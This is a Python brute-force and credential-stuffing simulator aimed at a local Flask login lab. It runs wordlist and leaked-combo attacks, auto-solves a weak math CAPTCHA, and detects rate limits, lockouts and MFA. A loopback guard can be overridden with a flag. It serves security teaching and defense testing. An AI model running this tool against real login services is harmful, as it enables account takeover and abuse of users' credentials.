#!/usr/bin/env python3
"""Brute-force / credential-stuffing simulator for the local Flask lab.

Authorized lab use ONLY. The target must be loopback (127.0.0.1 / localhost)
unless you pass --allow-remote to confirm you own the system.

Examples
--------
# dictionary attack against the vulnerable lab
python3 flask_login_lab.py --mode vulnerable &
python3 brute_force_sim.py --mode dictionary -u admin

# credential stuffing with a leaked-combo list
python3 brute_force_sim.py --mode stuff --combos combos.txt

# same runs against the hardened lab: the detector senses 429/lockout/CAPTCHA
python3 flask_login_lab.py --mode hardened &
python3 brute_force_sim.py --mode dictionary -u admin --solve-captcha

The simulator also acts as a *rate-limit detector*: it classifies every
response (success / invalid / rate_limited / locked / captcha / mfa), reads
Retry-After, backs off exponentially, and can abort once it sees the server
defending itself. Defenses turning on are reported, not hidden.
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from collections import Counter
from dataclasses import dataclass, field
from urllib.parse import urlparse

import requests

LOOPBACK = {"127.0.0.1", "localhost", "::1"}

DEFAULT_WORDLIST = ["123456", "password", "admin", "letmein", "qwerty",
                    "welcome", "iloveyou", "dragon", "12345678", "football"]

# Simulated leaked credential dump (from a breach the user reuses on).
DEFAULT_COMBOS = [
    "admin:password", "admin:123456", "admin:letmein",
    "demo:password", "demo:qwerty",
    "riya:OldPass1", "riya:Summer2024",
    "svc-backup:dragon", "svc-backup:backup123",
]


@dataclass
class Detector:
    """Classifies responses and drives adaptive backoff."""

    base_delay: float = 0.0
    max_delay: float = 5.0
    abort_after: int = 0          # 0 = never abort on rate limiting
    delay: float = field(init=False)
    counts: Counter = field(default_factory=Counter)
    aborted: bool = field(init=False, default=False)

    def __post_init__(self):
        self.delay = self.base_delay

    @staticmethod
    def classify(resp: requests.Response) -> str:
        body = resp.text.lower()
        if resp.status_code == 429 or "rate_limited" in body:
            return "rate_limited"
        if resp.status_code == 423 or "locked" in body:
            return "locked"
        if "captcha_required" in body:
            return "captcha_required"
        if "captcha_failed" in body:
            return "captcha_failed"
        if "mfa_required" in body:
            return "mfa"
        if resp.status_code == 200 and "welcome" in body:
            return "success"
        if resp.status_code == 401:
            return "invalid"
        return "error"

    def note(self, resp: requests.Response, kind: str) -> None:
        self.counts[kind] += 1
        if kind in ("rate_limited", "locked"):
            retry = resp.headers.get("Retry-After")
            if retry and retry.isdigit():
                self.delay = max(self.delay, float(retry))
            else:
                self.delay = min(self.max_delay, max(self.delay * 2, 0.5))
            if self.abort_after and self.counts["rate_limited"] >= self.abort_after:
                self.aborted = True
        elif kind in ("invalid", "success"):
            self.delay = max(self.base_delay, self.delay / 2)

    def pace(self) -> None:
        if self.delay:
            time.sleep(min(self.delay, self.max_delay))


def solve_captcha(challenge: str) -> str | None:
    """Solve the lab's trivial math CAPTCHA (shows why weak CAPTCHAs fail)."""
    try:
        left, right = challenge.replace("?", "").split("=")[0].split("+")
        return str(int(left.strip()) + int(right.strip()))
    except (ValueError, IndexError):
        return None


def attempt(session: requests.Session, url: str, user: str, pwd: str,
            detector: Detector, solve_captcha_flag: bool,
            captcha: str | None = None):
    payload = {"username": user, "password": pwd}
    if captcha is not None:
        payload["captcha"] = captcha
    try:
        resp = session.post(url, data=payload, timeout=5)
    except requests.RequestException as exc:
        detector.counts["error"] += 1
        print(f"[!] request error: {exc}")
        return "error"

    kind = detector.classify(resp)
    detector.note(resp, kind)

    if kind in ("rate_limited", "locked"):
        print(f"[!] {user}:{pwd} -> {kind} "
              f"(Retry-After={resp.headers.get('Retry-After', '-')})")
    elif kind == "captcha_required" and solve_captcha_flag:
        challenge = resp.json().get("challenge", "")
        answer = solve_captcha(challenge)
        print(f"[~] CAPTCHA wall for {user} ('{challenge}') -> solving '{answer}'")
        return attempt(session, url, user, pwd, detector, solve_captcha_flag, answer)
    elif kind == "success":
        print(f"[+] FOUND: {user}:{pwd}")
    elif kind == "mfa":
        print(f"[*] PASSWORD VALID: {user}:{pwd} -> MFA blocked takeover")
    elif kind == "invalid":
        print(f"[-] Failed: {user}:{pwd}")
    else:
        print(f"[?] {user}:{pwd} -> {kind} (HTTP {resp.status_code})")

    return kind


def reset_lab(session: requests.Session, base: str) -> None:
    try:
        session.post(f"{base}/lab/reset", timeout=5)
    except requests.RequestException:
        pass


def report(detector: Detector, attempts: int, elapsed: float,
           found: list[str]) -> None:
    print("\n================ RESULT ================")
    print(f"attempts   : {attempts}")
    if elapsed:
        print(f"elapsed    : {elapsed:.2f}s ({attempts / elapsed:.1f} attempts/s)")
    print(f"found      : {found or 'none'}")
    print("defenses   : " + (", ".join(
        f"{k}={v}" for k, v in sorted(detector.counts.items())
        if k in ("rate_limited", "locked", "captcha_required",
                 "captcha_failed", "mfa")) or "none engaged"))
    if detector.counts["mfa"]:
        print("             (password leaked/guessed, but MFA blocked login)")
    if detector.aborted:
        print("             -> aborted: rate limiter engaged, backing off further")
    print("========================================")


def main() -> None:
    parser = argparse.ArgumentParser(description="Lab brute-force simulator")
    parser.add_argument("--url", default="http://127.0.0.1:5000/login")
    parser.add_argument("--mode", choices=["dictionary", "stuff"],
                        default="dictionary")
    parser.add_argument("-u", "--user", default="admin",
                        help="target username (dictionary mode)")
    parser.add_argument("--wordlist", help="newline-delimited password file")
    parser.add_argument("--combos", help="user:password file (stuff mode)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="base delay between attempts (seconds)")
    parser.add_argument("--max-delay", type=float, default=5.0)
    parser.add_argument("--abort-after", type=int, default=0,
                        help="stop after N HTTP 429 responses (0 = never)")
    parser.add_argument("--solve-captcha", action="store_true",
                        help="auto-solve the lab's math CAPTCHA")
    parser.add_argument("--reset", action="store_true",
                        help="call /lab/reset before starting")
    parser.add_argument("--allow-remote", action="store_true",
                        help="confirm you are authorized to test a non-loopback target")
    args = parser.parse_args()

    host = urlparse(args.url).hostname
    if host not in LOOPBACK and not args.allow_remote:
        sys.exit(f"'{host}' is not loopback. Re-run with --allow-remote only "
                 f"for a host you own or are authorized to test.")

    base = args.url.rsplit("/", 1)[0]
    session = requests.Session()
    if args.reset:
        reset_lab(session, base)

    if args.mode == "dictionary":
        try:
            passwords = (open(args.wordlist).read().split()
                         if args.wordlist else DEFAULT_WORDLIST)
        except OSError as exc:
            sys.exit(f"cannot read wordlist: {exc}")
        pairs = [(args.user, p) for p in passwords]
    else:
        try:
            raw = (open(args.combos).read().splitlines()
                   if args.combos else DEFAULT_COMBOS)
        except OSError as exc:
            sys.exit(f"cannot read combos: {exc}")
        pairs = []
        for line in raw:
            line = line.strip()
            if line and ":" in line:
                u, p = line.split(":", 1)
                pairs.append((u, p))

    detector = Detector(base_delay=args.delay, max_delay=args.max_delay,
                        abort_after=args.abort_after)
    print(f"[*] mode={args.mode} target={args.url} attempts={len(pairs)}")
    print(f"[*] server={MODE_LABEL(session, base)}\n")

    found: list[str] = []
    attempts = 0
    start = time.time()
    for user, pwd in pairs:
        if detector.aborted:
            print("[!] aborting: rate limiter engaged")
            break
        attempts += 1
        kind = attempt(session, args.url, user, pwd, detector, args.solve_captcha)
        if kind in ("success", "mfa"):
            found.append(f"{user}:{pwd}")
        detector.pace()

    report(detector, attempts, time.time() - start, found)


def MODE_LABEL(session: requests.Session, base: str) -> str:
    try:
        data = session.get(f"{base}/", timeout=5).json()
        return f"{data.get('lab', '?')} ({data.get('mode', '?')})"
    except (requests.RequestException, json.JSONDecodeError, ValueError):
        return "unknown"


if __name__ == "__main__":
    main()
